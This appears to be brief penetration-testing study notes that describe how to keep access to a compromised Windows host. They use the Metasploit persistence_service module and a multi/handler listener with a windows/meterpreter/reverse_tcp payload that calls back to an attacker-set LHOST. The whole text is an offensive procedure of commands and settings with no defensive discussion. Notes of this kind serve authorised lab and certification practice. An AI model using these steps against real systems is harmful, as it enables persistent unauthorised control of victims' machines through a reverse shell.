# Establishing Persistence in Windows
After gaining a foothold, you will need to establish persistence on the target

1. Gain access to meterpreter on host
2. Background session

Module: **exploit/windows/local/persistence_service**  
This will create a persistant service that is paired with meterpreter payload  
- remote_exe_name
- Remote_exe_path
- Service_Name -- most important. May only need this one
- set payload -- can only be windows/meterpreter/reverse_tcp

1. Setup Multi Handler - ```use multi/handler```
2. set Payload -- ```set payload windows/meterpreter/reverse_tcp```
3. set LHOST
4. run
You should immediately receive a meterpreter session
